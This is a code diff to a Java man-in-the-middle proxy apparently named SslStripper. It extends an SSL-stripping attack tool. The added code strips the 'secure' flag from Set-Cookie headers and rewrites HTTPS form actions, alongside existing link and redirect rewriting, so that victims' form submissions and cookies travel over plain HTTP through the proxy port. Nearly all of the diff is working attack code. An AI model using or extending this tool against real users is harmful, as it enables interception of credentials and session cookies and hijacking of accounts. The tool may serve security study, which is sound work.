@@ -10,6 +10,7 @@ import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.io.Reader;
 import java.io.StringReader;
+import java.lang.reflect.Array;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
@@ -81,10 +82,10 @@ abstract class Filter {
 	abstract Object transform(Object data);
 }
 
-class RedirectFilter extends Filter {
+class HttpResponseManipulationFilter extends Filter {
 
 	Object transform(Object data) {
-	
+
 		HTTPResponse response = (HTTPResponse) data;
 		if (response.getStatusCode() >= 300 && response.getStatusCode() < 400) {
 			String location = response.getLocation();
@@ -94,9 +95,9 @@ class RedirectFilter extends Filter {
 			String newLocation = "";
 			newLocation = protocol + "://" +  uriAndLocator[0] + ":40034";
 			if (uriAndLocator.length == 2) {
-				 newLocation += "/" + uriAndLocator[1];
-			 }
-			
+				newLocation += "/" + uriAndLocator[1];
+			}
+
 			if(newLocation.startsWith("https")) {
 				newLocation = newLocation.replaceFirst("https", "http");
 			}
@@ -107,59 +108,140 @@ class RedirectFilter extends Filter {
 				System.err.println("location couldn't be changed");
 			}
 		}
+
+		try {
+			ArrayList setCookies = response.getSetCookies();
+			Iterator cookiesIterator = setCookies.iterator();
+			ArrayList changedCookies = new ArrayList();
+			while(cookiesIterator.hasNext()) {
+				String currentCookie = (String)cookiesIterator.next();
+				if (currentCookie.indexOf("secure") != -1) {
+					currentCookie = currentCookie.replaceFirst("secure", "");
+				}
+				changedCookies.add(currentCookie);
+			}
+			response.setCookies(changedCookies);
+		}	
+		catch (IOException e) {
+			System.err.println("cookies couldn't be changed");
+		}
 		return response;
 	}
-	
+
 }
 
 class SslStripperFilter extends Filter {
-	
+
 	private static final String HTML_CONTENT_TYPE = "text/html";
 	private static final String LINK_TAG_START = "<a href";
-	 
-	 public Object transform(Object data) {
-		 HTTPResponse response = (HTTPResponse) data;
-		 
-		 try {
-			 String contentType = response.getContentType();
+	private static final String FORM_TAG_START = "<form";
+
+	public Object transform(Object data) {
+		HTTPResponse response = (HTTPResponse) data;
+
+		try {
+			String contentType = response.getContentType();
 			if (contentType != null && contentType.indexOf(HTML_CONTENT_TYPE) != -1) {
-				 String stringBody = new String(response.getBody());
-				 
-				 int currentOccurrance = 0;
-				 while ((currentOccurrance = stringBody.indexOf(LINK_TAG_START,currentOccurrance)) != -1) {
-					 int endLink = stringBody.substring(currentOccurrance + 9).indexOf("\"") + currentOccurrance + 9;	
-					 String currentLink = stringBody.substring(currentOccurrance + 9, endLink);
-					 
-					 
-					 
-					 if (currentLink.startsWith("http")) {
-						// add Port to url
-						 String protocol = currentLink.split("://")[0];
-						 String withoutProtocol = currentLink.split("://")[1];
-						 String [] uriAndLocator = withoutProtocol.split("/",2);
-						 currentLink = protocol + "://" +  uriAndLocator[0] + ":" + SslStripper.PROXY_PORT;
-						 if (uriAndLocator.length == 2) {
-							 currentLink += "/" + uriAndLocator[1];
-						 }
-						 String stringBodyBeforeLink = stringBody.substring(0,currentOccurrance + 9);
-						 if (currentLink.startsWith("https")) {
-							 SocketConnectorFactory.addHost(uriAndLocator[0]);
-							 currentLink = currentLink.replaceFirst("https", "http");
-						 }
-						 stringBody = stringBodyBeforeLink + currentLink + stringBody.substring(endLink);				 
-					 }
-					 currentOccurrance++;
-				 }
-				 response.setBody(stringBody.getBytes());
-				 return response;
-			 }
-			
+				changeHttpsInAHref(response);
+				changeHttpsInForm(response);
+				return response;
+			}
+
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		 
+
 		return response;
+	}
+
+	private void changeHttpsInForm(HTTPResponse response ) throws IOException {
+		String stringBody = new String(response.getBody());
+		int currentOccurrance = 0;
+		
+		int attributesStartIndex = 6;
+		while ((currentOccurrance = stringBody.indexOf(FORM_TAG_START, currentOccurrance)) != -1) {
+			int endCurrentOccurance = stringBody.substring(currentOccurrance).indexOf(">");
+			String formElement = stringBody.substring(currentOccurrance, currentOccurrance + endCurrentOccurance + 1);
+			int formElementSize = formElement.length();
+			formElement = formElement.trim();
+			
+			String attributeString = formElement.substring(attributesStartIndex, formElement.lastIndexOf('>'));
+			String [] attributes = attributeString.split(" ");
+			
+			String stringBodyBeforeForm = stringBody.substring(0, currentOccurrance);
+			
+			String changedUrl = null;
+			for (int i = 0; i < attributes.length; i++) {
+				if (attributes[i].startsWith("action")) {
+					
+					String [] actionKV = attributes[i].split("=");
+					int urlIndex = 0;
+					if ((urlIndex = actionKV[1].indexOf("https")) != -1) {
+						actionKV[1] = actionKV[1].substring(urlIndex, actionKV[1].lastIndexOf("\""));
+						String protocol = actionKV[1].split("://")[0];
+						String withoutProtocol = actionKV[1].split("://")[1];
+						String [] uriAndLocator = withoutProtocol.split("/",2);
+						actionKV[1] = protocol + "://" + uriAndLocator[0] + ":" + SslStripper.PROXY_PORT;
+						if (uriAndLocator.length == 2) {
+							actionKV[1] += "/" + uriAndLocator[1];
+						}
+						if (actionKV[1].startsWith("https")) {
+							SocketConnectorFactory.addHost(uriAndLocator[0]);
+						}
+						changedUrl = actionKV[1];
+						
+					}
+					break;
+				}
+			}
+			
+			if (changedUrl == null) {
+				currentOccurrance++;
+				continue;
+			}
+			int formIndexBeforeAction = formElement.indexOf("action");
+			int formIndexAfterAction = formElement.substring(formIndexBeforeAction).indexOf("\"", formIndexBeforeAction + 7) + formIndexBeforeAction + 1;
+			if (changedUrl.startsWith("https")) {
+				changedUrl = changedUrl.replaceFirst("https", "http");
+				formElement = formElement.substring(0, formIndexBeforeAction) + "action=\"" + changedUrl +"\"" + formElement.substring(formIndexAfterAction);
+			}
+			
+			stringBody = stringBodyBeforeForm + formElement + stringBody.substring(currentOccurrance + endCurrentOccurance + 1);
+			currentOccurrance++;
+		}
+		response.setBody(stringBody.getBytes());
+	}
+
+	private void changeHttpsInAHref(HTTPResponse response) {
+		String stringBody = new String(response.getBody());
+
+		int currentOccurrance = 0;
+		while ((currentOccurrance = stringBody.indexOf(LINK_TAG_START,currentOccurrance)) != -1) {
+			int endLink = stringBody.substring(currentOccurrance + 9).indexOf("\"") + currentOccurrance + 9;	
+			String currentLink = stringBody.substring(currentOccurrance + 9, endLink);
+
+
+
+			if (currentLink.startsWith("http")) {
+				// add Port to url
+				String protocol = currentLink.split("://")[0];
+				String withoutProtocol = currentLink.split("://")[1];
+				String [] uriAndLocator = withoutProtocol.split("/",2);
+				currentLink = protocol + "://" +  uriAndLocator[0] + ":" + SslStripper.PROXY_PORT;
+				if (uriAndLocator.length == 2) {
+					currentLink += "/" + uriAndLocator[1];
+				}
+				String stringBodyBeforeLink = stringBody.substring(0,currentOccurrance + 9);
+				if (currentLink.startsWith("https")) {
+					SocketConnectorFactory.addHost(uriAndLocator[0]);
+					currentLink = currentLink.replaceFirst("https", "http");
+				}
+				stringBody = stringBodyBeforeLink + currentLink + stringBody.substring(endLink);				 
+			}
+			currentOccurrance++;
+		}
+		response.setBody(stringBody.getBytes());
 	}
 
 }
@@ -218,18 +300,52 @@ class HTTPResponse {
 	public void setBody(byte[] body) {
 		this.body = body;
 	}
-	
+
+	public ArrayList getSetCookies() throws IOException {
+		BufferedReader dataReader = new BufferedReader(new StringReader(serverResponseData));
+
+		ArrayList cookies = new ArrayList();
+		String currentLine;
+		while ((currentLine = dataReader.readLine()) != null) {
+			if (currentLine.toLowerCase().startsWith("set-cookie")) {
+				cookies.add(currentLine);
+			}
+		}
+
+		return cookies;
+	}
+
+	public void setCookies(ArrayList cookies) throws IOException {
+		BufferedReader dataReader = new BufferedReader(new StringReader(serverResponseData));
+
+		String changedResponse = "";
+		String currentLine;
+		while((currentLine = dataReader.readLine()) != null) {
+			if (!currentLine.toLowerCase().startsWith("set-cookie")) {
+				changedResponse += currentLine + "\r\n";
+			}
+		}
+		changedResponse = changedResponse.substring(0, changedResponse.lastIndexOf('\r'));
+		Iterator cookiesIterator = cookies.iterator();
+		while (cookiesIterator.hasNext()) {
+			changedResponse += cookiesIterator.next() + "\r\n";
+		}
+		changedResponse += "\r\n";	
+		serverResponseData = changedResponse;
+	}
+
+
 	public int getStatusCode() {
 		String serverResponseStatusInfo = serverResponseData.split("\\r\\n", 2)[0];
 		String statusCode = serverResponseStatusInfo.split(" ")[1];
 		int code = Integer.parseInt(statusCode);
 		return code;
 	}
-	
+
 	public void setStatusCode(int code) {
 		String statusInfo[] = serverResponseData.split("\\r\\n",2);
 		String serverResponseHeaders = serverResponseData.split("\\r\\n", 2)[1];
-		
+
 		String changedInfo = statusInfo[0] + code + statusInfo[2];
 		serverResponseData = changedInfo + "\r\n" + serverResponseHeaders;
 	}
@@ -244,10 +360,10 @@ class HTTPResponse {
 		}
 		return null;
 	}
-	
+
 	private void changeValue(String header, String value) throws IOException {
 		BufferedReader dataReader = new BufferedReader(new StringReader(serverResponseData));
-		
+
 		String newHeader = "";
 		String currentLine;
 		while ((currentLine = dataReader.readLine()) != null) {
@@ -258,10 +374,10 @@ class HTTPResponse {
 		}
 		serverResponseData = newHeader;
 	}
-	
+
 	private String findValue(String header) throws IOException {
 		BufferedReader dataReader = new BufferedReader(new StringReader(serverResponseData));
-		
+
 		String currentLine;
 		while ((currentLine = dataReader.readLine()) != null) {
 			if (currentLine.startsWith(header)) {
@@ -270,22 +386,22 @@ class HTTPResponse {
 		}
 		return null;
 	}
-	
+
 	public void setLocation(String location) throws IOException {
 		changeValue("Location", location);
 	}
-	
+
 	public String getLocation()  {
 		try {
 			return findValue("Location");
-			
+
 		}
 		catch (IOException e) {
 			return null;
 		}
 	}
-	
-	
+
+
 	public byte[] getByteArray() {
 		byte[] byteArray = new byte[serverResponseData.length() + body.length];
 		byte[] header;
@@ -294,7 +410,7 @@ class HTTPResponse {
 		System.arraycopy(body, 0, byteArray, serverResponseData.length(), body.length);
 		return byteArray;
 	}
-	
+
 }
 
 class HTTPRequest {
@@ -413,7 +529,7 @@ class HTTPRequestParameters {
 		}
 		while(keySetIterator.hasNext()) {
 			String currentKey = (String)keySetIterator.next();
-			parameterString += "&" + parameters.get(currentKey) + "=" + parameters.get(currentKey);
+			parameterString += "&" + currentKey + "=" + parameters.get(currentKey);
 		}
 		return parameterString;
 	}
@@ -455,14 +571,14 @@ class HTTPParser {
 		String currentLine;
 		String headerResponse = "";
 		try {
-			
+
 			while ((currentLine = headerReader.readLine()) != null && currentLine.length() != 0) {
 				headerResponse += currentLine + "\r\n";
 			}
 			headerResponse += "\r\n";
-			
+
 			byte [] body = new byte[response.length - headerResponse.length()];
-			
+
 			System.arraycopy(response, headerResponse.length(), body, 0, body.length);
 			/*
 			for (int i = 0; i < correctedNrOfChunks; i++) {
@@ -477,7 +593,7 @@ class HTTPParser {
 		catch (IOException e) {
 			System.err.println(e.getMessage());
 		}
-		
+
 		return null;
 	}
 
@@ -558,10 +674,10 @@ class HTTPParser {
 					else {
 						additionalParams += "Connection: close" + "\r\n";
 					}
-					
-					
-					
-					
+
+
+
+
 				}else {
 					break;
 				}
@@ -724,7 +840,7 @@ class Proxy {
 		rewritten += request.getAdditionalParams();
 		return rewritten;
 	}
-	
+
 	public void afterServerResponse(Filter afterFilter) {
 		afterFilterChain.add(afterFilter);
 	}
@@ -773,13 +889,13 @@ class Proxy {
 			byte [] response = connection.read();
 
 			HTTPResponse parsedResponse = HTTPParser.getInstance().parse(response);
-			
+
 			Iterator filterIterator = afterFilterChain.iterator();
 			while (filterIterator.hasNext()) {
 				Filter currentFilter = (Filter)filterIterator.next();
 				parsedResponse = (HTTPResponse) currentFilter.transform(parsedResponse);
 			}
-			
+
 			output.write(parsedResponse.getByteArray());
 			output.flush();
 			connection.close();
@@ -816,7 +932,7 @@ class StripperThread implements Runnable {
 	public void run() {
 		Proxy proxy = new Proxy(socket);
 		proxy.afterServerResponse(new SslStripperFilter());
-		proxy.afterServerResponse(new RedirectFilter());
+		proxy.afterServerResponse(new HttpResponseManipulationFilter());
 		proxy.proxyConnection();
 	}
 
